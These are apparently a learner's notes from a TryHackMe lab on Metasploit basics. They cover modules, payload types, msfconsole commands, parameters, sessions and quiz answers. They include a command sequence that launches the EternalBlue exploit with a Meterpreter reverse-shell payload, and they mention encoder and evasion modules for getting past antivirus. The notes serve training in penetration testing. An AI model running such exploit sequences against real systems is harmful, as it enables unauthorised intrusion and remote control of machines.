# Metasploit: Basics

## What Metasploit Allows a User To Do

- Discover vulnerabilities in systems and applications  
- Scan and enumerate networks and services  
- Launch known exploits against vulnerable targets  
- Deliver payloads after successful exploitation  
- Gain remote command-line or Meterpreter access  
- Perform post-exploitation activities (privilege escalation, credential gathering, lateral movement)  
- Test security defenses and validate whether vulnerabilities are exploitable  
- Automate penetration testing workflows  
- Develop and test custom exploits, payloads, and modules

---

## Common Workflow

A common workflow looks like:

1. Scan a target  
2. Find a vulnerability  
3. Select an exploit module  
4. Configure a payload  
5. Launch the exploit  
6. Interact with the compromised system

**Example (text only):**  
search smb  
use exploit/windows/smb/ms17_010_eternalblue  
set RHOSTS 10.10.10.5  
set PAYLOAD windows/x64/meterpreter/reverse_tcp  
run

---

## Main Components

- **msfconsole** — The main command-line interface  
- **Modules** — Exploits, scanners, payloads, post modules, etc.  
- **Tools** — Utilities that assist with vulnerability research, assessment, or penetration testing. Examples: `msfvenom`, `pattern_create`, `pattern_offset`

---

## Modules

- **Auxiliary** — Scanners, crawlers, fuzzers  
- **Encoders** — Encode exploit/payload to help evade signature-based antivirus detection  
- **Evasion** — Modules that attempt to evade detection mechanisms  
- **Exploits** — Exploit modules organized by target system or vulnerability  
- **NOPs** — “No Operation” instructions (e.g., `0x90` on x86). Used as padding/buffers to maintain consistent payload sizes  
- **Payloads** — Actions executed after exploitation (open a shell, run commands, load a backdoor, launch `calc.exe` as PoC). Provide interactive connections to execute commands on the target system

### Payload directories (4)
1. **Adapters** — Wrap single payloads into different formats (e.g., PowerShell adapter that produces a single command to execute the payload)  
2. **Singles** — Self-contained payloads that do not require additional components  
3. **Stagers** — Set up a communication channel between attacker and target; used with staged payloads (stager uploads a small loader, then downloads the stage)  
4. **Stages** — Downloaded by the stager; allow larger, more complex payloads

---

## Useful Commands (text only list)

- help  
- history  
- use (module) — e.g., use exploit/windows/smb/ms17_010_eternalblue  
- show (options, payloads, auxiliary)  
- back  
- info (module name)  
- search — e.g., search ms17-010  
- search type:auxiliary telnet — search specific types of modules  
- set PARAMETER_NAME VALUE  
- unset (PARAMETER)  
- unset all  
- setg / unsetg — set or unset a global value across modules (persists until exit)

**Prompt contexts to watch (text only):**

- Regular command prompt — no Metasploit commands will work until `msfconsole` is started  
- `msf` prompt — Metasploit commands available  
- `msf exploit(...)` prompt — module-specific commands only  
- `meterpreter` prompt — Meterpreter-specific commands

Once a Meterpreter session is established, you can often spawn a system shell to run regular OS commands.

---

## Working With Modules

After entering a module context with the `use` command followed by the module name, set required parameters.

- Use `show options` to list required parameters  
- Set parameters with: `set PARAMETER_NAME VALUE`  
- Change parameters with `set` again, or clear with `unset` / `unset all`

### Parameters breakdown
- **RHOSTS** — Remote host (target IP address)  
- **RPORT** — Remote port (target service port)  
- **PAYLOAD** — Payload to use with the exploit  
- **LHOST** — Local host (attacker IP)  
- **LPORT** — Local port (attacker listening port for reverse shells)  
- **SESSION** — Session ID for an existing connection; used by post-exploitation modules

### Navigating modules (text only example)
1. use exploit/windows/smb/ms17_010_eternalblue  
2. setg rhosts 10.10.165.39  
3. back  
4. use auxiliary/scanner/smb/smb_ms17_010  
5. show options

---

## Using Modules

- Launch the module with the `exploit` or `run` command  
- `exploit -z` runs the exploit and backgrounds the session as soon as it opens (text only)  
- Some modules support `check` to test whether a target is vulnerable without exploiting it

---

## Sessions

- Upon successful exploitation, a **session** is created — the communication channel between Metasploit and the target  
- Background a session with `background` or `CTRL+Z`  
- List sessions with `sessions`  
- Interact with a session using `sessions -i <ID>` (text only example: sessions -i 2)

---

## TryHackMe Quiz

**How would you set the LPORT value to 6666?**  
set LPORT 6666

**How would you set the global value for RHOSTS to 10.10.19.23?**  
setg RHOSTS 10.10.19.23

**What command clears a set payload?**  
unset PAYLOAD

**What command proceeds with exploitation?**  
exploit

---

## Practical Summary (TryHackMe) — text only

On TryHackMe's attack box / virtual machine I successfully:

- Accessed Metasploit using "msfconsole"  
- Loaded the exploit module with "use exploit/windows/smb/ms17_010_eternalblue"  
- Set the RHOST parameter to the virtual machine I was attacking with "setg rhosts 10.10.165.39"  
- Executed the exploit with the command "run"

Metasploit then used a scanner to check for vulnerabilities, found one, and established a connection back to me with a Meterpreter session.
